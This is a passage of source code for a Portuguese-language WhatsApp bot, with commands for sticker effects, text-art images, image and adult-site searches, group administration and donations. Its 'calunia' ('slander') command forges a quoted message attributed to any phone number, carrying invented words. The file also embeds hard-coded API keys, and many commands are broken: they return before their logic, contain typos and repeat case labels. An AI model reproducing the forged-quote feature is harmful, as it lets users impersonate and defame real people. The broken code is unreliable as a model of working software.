enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/hitler?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'wanted':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
qkl = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${qkl.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/wanted?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'calunia':
if (args.length == 2) return enviar(`Use assim: ${prefix + command} 558167892920|sou gay|Já sabia\nPode usar qualquer coisa`)
k = `${body.slice(10)}`
txt1 = k.split("|")[0];
txt2 = k.split("|")[1];
txt3 = k.split("|")[2];
tomioka.sendMessage(from, `${txt3}`,text,{quoted:{    key: {fromMe: false,participant: `${txt1}@s.whatsapp.net`,},message: { "extendedTextMessage": {"text": `${txt2}`,"title": `Hmm`}}}})
break
case 'triggered':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
dsr = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${dsr.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/triggered?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'rip':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
qhy = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${qhy.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/rip?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break 
case 'trash':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
der = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${der.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/trash?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'preso':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
lder = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${lder.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/jail?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'figupet':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/petpet?url=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break 
case 'heroiimg':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://dapuhy-api.herokuapp.com/api/canvas/crush?img=${imgtrg}&apikey=eZmRwQ7L04xF6d9`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break 
//modulo maker
case 'grass':
    if (!isPremium) return enviar ('só premium')
if (!q) return reply('onde está o texto?')
pMsgGrass(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
break
case 'doubleheart':
    if (!isPremium) return enviar ('só premium')
if (!q) return reply('onde está o texto?')
pDoubleHeart(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
break
case 'coffecup':
    if (!isPremium) return enviar ('só premium')
if (!q) return reply('onde está o texto?')
pCoffeCup(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
break
case 'romantic':
    if (!isPremium) return enviar ('só premium')
if (!q) return reply('onde está o texto?')
pRomantic(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		
break
case 'smoky':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pSmoky(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break					
case 'naruto':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pNaruto(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
		case 'semi':
		   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pSemi(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
		case 'ouro':
		   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pOuro(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
		case 'fogo':
		   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pFogo(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'shadow':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pShadow(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'romantic':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pRomantic(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'smoke':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pSmoke(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'burnpaper':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pBurnPapper(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'lovemsg':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pLoveMsg(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'grass':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pMsgGrass(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'doubleheart':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pDoubleHeart(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'coffecup':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pCoffeCup(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'lovetext':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pLoveText(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'butterfly':
   if (!isPremium) return enviar ('só premium')

if (!q) return reply('onde está o texto?')
pButterfly(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
//@Tio Tomioka YT					
case 'pokemon':
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://api.fdci.se/rep.php?gambar=pokemon`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { contextInfo: null, quoted: tomio, contextInfo: tome})

break
case 'wolf':  
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
F = body.slice(6)
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=TioTomioka&text1=rimurubotz&text2=${F}`)
tomioka.sendMessage(from, anu, image, {caption: `Aqui está 😊`, quoted: msg})
break    
case 'ytsearch':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
if (args.length < 1) return enviar ('Tolong masukan query!')

const srch = args[0];

try {

var aramas = await yts(srch);

} catch {

return await tomioka.sendMessage(from, 'Error!', MessageType.text,)

}

aramat = aramas.all 

var tbuff = await getBuffer(aramat[0].image)

var ytresult = '';

ytresult += '「 *YOUTUBE* 」'

ytresult += '\n________________________\n\n'

aramas.all.map((video) => {

ytresult += '❏ Titulo: ' + video.title + '\n'

ytresult += '❏ Link: ' + video.url + '\n________________________\n\n'

});

ytresult += '◩ *Tomioka-self*'

await tomioka.sendMessage(from, tbuff, image, {thumbnail: fs.readFileSync('./assets/foto.png'),quoted: msg, caption: ytresult})


break
case 'textblue':
if (args.length < 1) return enviar (mess.blank)
tels = body.slice(9)
if (tels.ength > 10) return enviar ('O texto é longo, até 9 caracteres')
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=blue_metal&text=${tels}&apiKey=administrator`, {method: 'get'})
buff = await getBuffer(anu.result)
tomioka.sendMessage(from, buff, image, {quoted: msg})
break
case 'rize':
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://imgur.com/gallery/s1ecUj8`, {method: 'get'})
ri = JSON.parse(JSON.stringify(anu));
ze =  ri[Math.floor(Math.random() * ri.length)];
nye = await getBuffer(ze)
tomioka.sendMessage(from, nye, image, { caption: 'rize chan!!', contextInfo: null, quoted: tomio, contextInfo: tome})

break 
case 'mia':
if (!isNsfw) return enviar (' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://testesw.herokuapp.com/`, {method: 'get'})
ri = JSON.parse(JSON.stringify(anu));
ze =  ri[Math.floor(Math.random() * ri.length)];
nye = await getBuffer(ze)
tomioka.sendMessage(from, nye, image, { caption: 'i love you, mia 🥺❤️', contextInfo: null, quoted: tomio, contextInfo: tome})

break 
case 'qrcode':
if (!isPremium) return enviar ('só premium')

const tex = encodeURIComponent(body.slice(8))
if (!tex) return tomioka.sendMessage(from, 'Digite um texto/url que deseja criar um código qr', text, {quoted: msg})
const bufferr = await getBuffer(`https://api.qrserver.com/v1/createSticker-qr-code/?size=500x500&data=${tex}`)
tomioka.sendMessage(from, bufferr, image, {quoted: msg})
break
case 'texteng':
if (args.length < 1) return enviar (mess.blank)
tels = body.slice(9)
if (tels.ength > 10) return enviar ('O texto é longo, até 9 caracteres')
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=sand_engraved&text=${tels}&apiKey=administrator`, {method: 'get'})
buff = await getBuffer(anu.result)
tomioka.sendMessage(from, buff, image, {quoted: msg})
break

case 'brainly':
brien = body.slice(9)
brainly(`${brien}`).then(res => {
teks = '♡───────────♡\n'
for (let Y of res.data) {
teks += `\n*「 BRAINLY 」*\n\n*➸ Questão:* ${Y.pertanyaan}\n\n*➸ Resposta:* ${Y.jawaban[0].text}\n♡───────────♡\n`
}
tomioka.sendMessage(from, teks, text, {quoted: msg, detectLinks: false})
console.log(res)
})

break
case 'premiumlist':
teks = '╭────*「 *USUÁRIOS PREMIUM👑* 」\n'
for (let V of premium) {
teks += `│+  @${V.split('@')[0]}\n`
}
teks += `│+ Total : ${premium.length}\n╰──────*「 *TOMIOKA BOT* 」`
tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": premium}})
break
/*     case 'qrcode':
if (!isPremium) return enviar ('só premium')
const tex = encodeURIComponent(body.slice(8))
if (!tex) return tomioka.sendMessage(from, 'Digite um texto/url que deseja criar um código qr', text, {quoted: msg})
const bufferr = await getBuffer(`https://api.qrserver.com/v1/createSticker-qr-code/?size=500x500&data=${tex}`)
tomioka.sendMessage(from, bufferr, image, {quoted: msg})
break*/
case 'wa.me':
case 'wame':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing) 
options = {
text: `「 *LINK WHATSAPP* 」\n\n_Solicitado por_ : *@${sender.split("@s.whatsapp.net")[0]}*\n\nSeu link WhatsApp:\n\n*https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n\n*Ou*\n\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*\n\n*_TOMIOKABOT_*`,
contextInfo: { mentionedJid: [sender] }
}
tomioka.sendMessage(from, options, text, { contextInfo: null, quoted: tomio, contextInfo: tome} )
break
case 'playstore':
ps = `${body.slice(11)}`
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/playstore?q=${ps}`, {method: 'get'})
store = '======================\n'
for (let ply of anu.result){
store += `• *Nome Apk:* ${ply.app.name}\n• *ID:* ${ply.app.id}\n• *Link Apk:* ${ply.app.url}\n===================°]\n`
}
enviar(store.trim())
break
/*   case 'pornhub':
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
if (args.length < 1) return enviar ('Cadê o texto, mano?')
teks = body.slice(9)
anu = await fetchJson(`https://api.arugaz.my.id/api/media/pornhub/search?query=${teks}`, {method: 'get'})
teks = `===============\n`
for (let bokep of anu.result) {
teks += `Título: ${bokep.title}\nAtor: ${bokep.author}\nVisualizadores: *${bokep.views}*\nDuração: ${bokep.duration}\nLink: ${bokep.link}\n===============\n`
}
enviar(teks.trim())

break  */
case 'nekopoi':
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
if (args.length < 1) return enviar ('Cadê o texto, mano?')
teks = body.slice(9)
anu = await fetchJson(`https://api.vhtear.com/nekosearch?query=${teks}&apikey=${VthearApi}`, {method: 'get'})
teks = `===============\n`
for (let neko of anu.result) {
teks += `Título: ${neko.title}\nDescrição: ${neko.detail}\n===============\n`
}
enviar(teks.trim())

break  
case 'xvideos':
if (args.length < 1) return enviar ('Cadê o texto, mano?')
anu = await fetchJson(`https://api.arugaz.my.id/api/media/xvideo/search?query=${body.slice(9)}`, {method: 'get'})
teks = `===============\n`
for (let b of anu.result) {
teks += `• Título: ${b.title}\n• Info: ${b.info}\n• Link: ${b.link}\n===============\n`
}
enviar(teks.trim())

break 
case 'onichan':
case 'bodoh':
tomioka.sendMessage(from, buff, './lindy/baka.mp3', audio/mp3, {quoted: msg, ptt:true})
break
case 'hunti':
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://api.vhtear.com/nhentaipdfdownload?query=287167&apikey={BELI APIKEY BIAR WORK DI 0816546638}`, {method: 'get'})
if (anu.error) return enviar (anu.error)
bufferjj = await getBuffer(anu.result.pdf_file)
tomioka.sendMessage(from, bufferjj, document, {mimetype: 'document/pdf', quoted: msg})
break
case 'setdesc':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
tomioka.groupUpdateDescription(from, `${body.slice(9)}`)
tomioka.sendMessage(from, 'Descrição alterada com sucesso', text, {quoted: msg})
break
case 'speed':
case 'ping':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
const timestamp = speed();
const latensi = speed() - timestamp
tomioka.updatePresence(from, Presence.composing) 
uptime = process.uptime()
tomioka.sendMessage(from, 
`SPEED: *${latensi.toFixed(4)} _SEGUNDO_*
*O BOT ESTEVE ATIVO POR*
*${kyun(uptime)}*`, text, { quoted: tomio, contextInfo: tome})
break
case 'delete':
case 'del':
case 'd':  
if (!isPremium) return enviar ('só premium')
tomioka.deleteMessage(from, { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
break
case 'playmp3':
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
play = body.slice(9)
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=${ZeksApi}`, {method: 'get'})
if (anu.error) return enviar (anu.error)
infomp3 = `「 *TIMELINE PLAY MP3* 」\n*• Título:* ${anu.result.title}\n*• Link:* ${anu.result.source}\n*• Tamanho:* ${anu.result.size}\n\n*ESPERE NOVAMENTE ENVIANDO POR FAVOR, NÃO SPAME O CHAT*`
buffer = await getBuffer(anu.result.thumbnail)
lagu = await getBuffer(anu.result.url_audio)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: infomp3})
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: msg})

break 
case 'smule':
if (args.length < 1) return enviar ('Cadê o url mano?')
if (!isUrl(args[0]) && !args[0].includes('c-ash.smule')) return enviar (mess.error.Iv)
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://mnazria.herokuapp.com/api/smule?link=${args[0]}`, {method: 'get'})
if (anu.error) return enviar (anu.error)
teks = `*Título* : ${anu.title}\n\n Espere 1 minuto, talvez um pouco mais porque o download de vídeos esta executando`
thumb = await getBuffer(anu.thumb)
tomioka.sendMessage(from, thumb, image, {quoted: msg, caption: teks})
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: msg, caption: 'Aqui mano'})

break  
case 'donate': case 'doar':
console.log(color('[DOAR]', 'blue'), color(`DOAÇAO ATIVADA!`, 'pink'))
donate = `Incentive meu criador fazendo uma doação via pix:\n`
donate2 = `aa204cca-88cd-47c9-8727-1d335c55aa93`
tomioka.sendMessage(from, donate, text, {quoted: tomio, contextInfo: tome})
tomioka.sendMessage(from, donate2, text, {quoted: tomio, contextInfo: tome})
break 
case 'desbloquear':
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar (mess.only.ownerB)
tomioka.blockUser (`${body.slice(9)}@c.us`, "remove")
tomioka.sendMessage(from, `perintah Diterima, membuka blokir ${body.slice(9)}@c.us`, text)
break
case 'bloquear':
tomioka.updatePresence(from, Presence.composing) 
tomioka.chatRead (from)
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar (mess.only.ownerB)
tomioka.blockUser (`${body.slice(7)}@c.us`, "add")
tomioka.sendMessage(from, `ESTE COMANDO NÃO ESTÁ FUNCIONANDO, EM BREVE SERÁ CORRIGIDO ${body.slice(7)}@c.us`, text)
break
case 'image':
if (args.length < 1) return enviar ('O que você quer procurar, mana?')
goo = body.slice(7)
anu = await fetchJson(`https://api.vhtear.com/googleimg?query=${goo}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
var pol = JSON.parse(JSON.stringify(anu.result.result_search));
var tes2 =  pol[Math.floor(Math.random() * pol.length)];
pint = await getBuffer(tes2)
tomioka.sendMessage(from, pint, image, { caption: '*Google Image*\n\n*Resultado da pesquisa : '+goo+'*', contextInfo: null, quoted: tomio, contextInfo: tome})
break
/*        case '.':
goo = body.slice(2)
anu = await fetchJson(`https://api.vhtear.com/googleimg?query=${goo}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
var pol = JSON.parse(JSON.stringify(anu.result.result_search));
var tes2 =  pol[Math.floor(Math.random() * pol.length)];
pint = await getBuffer(tes2)
tomioka.sendMessage(from, pint, image, { caption: '*Google Image*\n\n*Resultado da pesquisa : '+goo+'*', contextInfo: null, quoted: tomio, contextInfo: tome})
break  */
case '.':
tels = body.slice(2)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://api.fdci.se/rep.php?gambar=${tels}`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: `*PINTEREST*\n\*Resultado da pesquisa* : *${tels}*`})

break
case 'playstore':
kuji = body.slice(7)
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await getBuffer(`https://api.vhtear.com/playstore?query={kuji}&apikey=Aris komtol`, {method: 'get'})
capty = `*➸ title :* ${anu.title}\n*➸ app_id :* ${anu.app_id}\n*➸ description :* ${anu.description}\n*➸ developer_id :* ${anu.developer_id}\n*➸ developer :* ${anu.developer}\n*➸ score :* ${anu.score}\n*➸ full_price :* ${anu.full_price}\n*➸ price :* ${anu.price}\n*➸ free :* ${anu.free}`
tomioka.sendMessage(from, anu, image, {quoted: msg, caption: capty})
break
case 'otagall2':
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `*😘* ${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'pinterest':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=${tels}`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: `*PINTEREST*\n\*Resultado da pesquisa* : *${tels}*`})

break
case 'anime':

tomioka.updatePresence(from, Presence.composing)
am = ["anime tumblr",
"wallpaper anime hd",
"anime aestethic",
"anime hd"
]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
enviar(ptbr.wait())
n = JSON.parse(JSON.stringify(data));
nimsg = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, {
quoted: msg,
caption: `💮`
})
break
//_PESQUISA ESPECÍFICA DE FOTO 
case 'naruto':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=naruto`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*naruto uzumikin*'})

break
case 'sakura':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=sakura`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*sakura*'})

break
case 'saske':
case 'sasuke':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
